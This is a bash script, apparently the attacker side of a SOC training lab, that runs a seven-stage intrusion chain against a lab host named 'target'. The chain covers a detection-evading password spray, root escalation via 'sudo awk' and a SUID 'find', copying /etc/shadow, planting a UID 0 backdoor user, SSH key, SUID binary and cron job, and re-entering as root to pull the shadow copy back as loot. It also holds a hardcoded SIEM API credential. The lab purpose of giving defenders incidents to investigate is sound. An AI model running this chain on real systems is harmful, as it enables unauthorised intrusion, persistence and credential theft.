#!/bin/bash
# =====================================================================================
# Ke tan cong (Bai 17) - chuoi 7 GIAI DOAN, moi giai doan cach nhau >= 2' de dung TIMELINE:
#   (0) SPRAY       : do 1 mat khau pho bien len NSPRAY tai khoan, RAI CHAM (25-35s/lan) -> ne luat
#                     brute-force mac dinh (dem theo IP trong cua so ngan). Lan cuoi = tai khoan bi chiem.
#   (1) ACCESS      : dang nhap tai khoan bi chiem (chinh lan thu cuoi cua dot do)          [GOC]
#   (2) DISCOVERY   : liet ke quyen sudo (sudo -l -> COMMAND=list), tim file SUID
#   (3) ESCALATION  : len root qua sudo awk (chung minh ca SUID find)                        [GOC]
#   (4) CRED ACCESS : chep /etc/shadow ra file an trong /tmp (FIM thay); ghi GT CRED_*
#   (5) PERSISTENCE : plant.sh - UID 0, SSH key (THAT), SUID an, cronjob                     [GOC]
#   (6) RE-ENTRY    : dang nhap ROOT bang SSH key vua cai, keo ban chep shadow ve; bao READY
# Ten ca nhan hoa: EMPNUM, NSPRAY (parameter.config).
# Phat trien nhanh: tao file /home/ubuntu/.fast -> moi khoang cho chia 4 (XOA truoc khi phat hanh).
# =====================================================================================
TARGET=target
VICTIM=empEMPNUM;  VPW=Password123
BDUSER=svc-EMPNUM
NSP=NSPRAY
DIV=1; [ -f /home/ubuntu/.fast ] && DIV=4
nap() { sleep $(( $1 / DIV )); }
OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 \
-o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1"
KOPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 \
-o PreferredAuthentications=publickey -o IdentitiesOnly=yes -o PasswordAuthentication=no -i /home/ubuntu/.ssh/bk"
run_v() { sshpass -p "$VPW" ssh $OPTS "$VICTIM@$TARGET" "$1" 2>/dev/null; }
as_root() {  # chay 1 script voi quyen root tren target qua sudo awk (cung co che leo quyen goc)
  local f=/tmp/.u$RANDOM
  sshpass -p "$VPW" scp $OPTS "$1" "$VICTIM@$TARGET:$f" 2>/dev/null
  run_v "sudo -n awk 'BEGIN{system(\"bash $f 2>/dev/null; rm -f $f\")}'"
}
decoy_list() {   # CUNG cong thuc voi target/_bin/fixlocal.sh
  local n=$1 k=1 got=0 name
  while [ "$got" -lt "$n" ]; do
    name=$(printf 'emp%04d' $(( (EMPNUM + k*37) % 9000 + 1000 )))
    k=$((k+1))
    [ "$name" = "$VICTIM" ] && continue
    echo "$name"; got=$((got+1))
  done
}
log() { echo "$(date +%H:%M:%S) $*"; }

# KHONG mo cong 22 de "thu" sshd: ket noi rong sinh dong "Bad protocol version identification ''
# from 172.20.0.5" trong auth.log -> lam nhieu moc TIME_SPRAY. Cong doan cho siem ben duoi (vai phut)
# du de target + sshd san sang.
# KHONG "tham do" bang tai khoan gia: moi lan dang nhap that bai tu .5 se lam lech moc TIME_SPRAY.
# Cho siem SEED XONG (seed restart manager -> su kien luc do bi mat). Tin hieu: user API soc-tool
# (seed tao o CUOI, sau restart) dang nhap duoc. Toi da 20 phut roi chay tiep du sao.
# (Ha tang lab, khong thuoc kich ban: sinh vien khong vao duoc attacker.)
for i in $(seq 1 120); do
  curl -sk -m 5 -u 'soc-tool:Soc.Tool.2026!' -X POST \
    https://172.20.0.20:55000/security/user/authenticate 2>/dev/null | grep -q '"token"' && break
  sleep 10
done
log "siem san sang sau $((i*10))s"
nap 120      # agent target ket noi lai manager sau restart

# ===== (0) PASSWORD SPRAY - rai cham, moi tai khoan DUNG 1 lan, tai khoan bi chiem o CUOI =====
log "stage0 spray NSP=$NSP"
for u in $(decoy_list $((NSP - 1))); do
  sshpass -p "$VPW" ssh $OPTS "$u@$TARGET" true 2>/dev/null
  sleep $(( (25 + RANDOM % 11) / DIV ))
done
# ===== (1) INITIAL ACCESS = lan thu cuoi cua dot do (thanh cong) -> moc TIME_ACCESS =====
log "stage1 access"
until run_v "id >/dev/null 2>&1"; do sleep 5; done

nap 120
# ===== (2) DISCOVERY: liet ke quyen sudo + tim SUID -> moc TIME_DISCOVERY =====
log "stage2 discovery"
run_v "sudo -n -l >/dev/null 2>&1; find / -perm -4000 -type f 2>/dev/null >/dev/null"

nap 120
# ===== (3) PRIVILEGE ESCALATION (goc): sudo awk -> moc TIME_ESCALATION =====
log "stage3 escalation"
for i in $(seq 1 12); do
  run_v "sudo -n awk 'BEGIN{system(\"id > /tmp/.rootproof 2>/dev/null; chmod 644 /tmp/.rootproof 2>/dev/null; echo escalated_via_sudo_awk >> /root/.breach 2>/dev/null\")}'"
  run_v "test -s /tmp/.rootproof" && break
  sleep 10
done
run_v "find /etc/hostname -exec /bin/bash -p -c 'echo also_escalated_via_suid_find >> /root/.breach' \;"

nap 120
# ===== (4) CREDENTIAL ACCESS: chep /etc/shadow ra file an trong /tmp -> moc TIME_CRED =====
log "stage4 cred"
CF="/tmp/.$(tr -dc 'a-z0-9' </dev/urandom | head -c 8)-cache"
cat > /tmp/s4.sh <<S4
cp /etc/shadow $CF && chmod 644 $CF
printf 'CRED_FILE=%s\nCRED_TIME=%s\n' '$CF' "\$(date +%H:%M)" >> /root/.soc_truth
S4
for i in $(seq 1 10); do
  as_root /tmp/s4.sh
  run_v "test -s $CF" && break
  sleep 10
done
rm -f /tmp/s4.sh

nap 120
# ===== (5) PERSISTENCE (goc): plant.sh - nhieu lop, retry den khi backdoor ton tai -> moc TIME_PERSIST =====
log "stage5 persist"
for i in $(seq 1 15); do
  sshpass -p "$VPW" scp $OPTS /home/ubuntu/plant.sh "$VICTIM@$TARGET:/tmp/plant.sh" 2>/dev/null
  run_v "sudo -n awk 'BEGIN{system(\"bash /tmp/plant.sh 2>/dev/null\")}'"
  run_v "id $BDUSER >/dev/null 2>&1" && break
  sleep 20
done

nap 120
# ===== (6) RE-ENTRY: dang nhap ROOT bang SSH key da cai, keo ban chep shadow ve -> moc TIME_REENTRY =====
log "stage6 reentry"
for i in $(seq 1 15); do
  ssh $KOPTS "root@$TARGET" "cat $CF" > /home/ubuntu/loot-shadow.txt 2>/dev/null && [ -s /home/ubuntu/loot-shadow.txt ] && break
  sleep 15
done
# Bao hieu BAT DAU CA TRUC cho sinh vien (doc duoc boi moi user)
ssh $KOPTS "root@$TARGET" "echo 'READY - su co da xay ra, ca truc bat dau' > /var/run/soc-ca-truc; chmod 644 /var/run/soc-ca-truc" 2>/dev/null
touch /home/ubuntu/.chain_done
log "chain done"

# Cronjob doc (plant.sh) tu chay moi 2' = tin hieu dinh ky. Giu container song.
while true; do sleep 3600; done
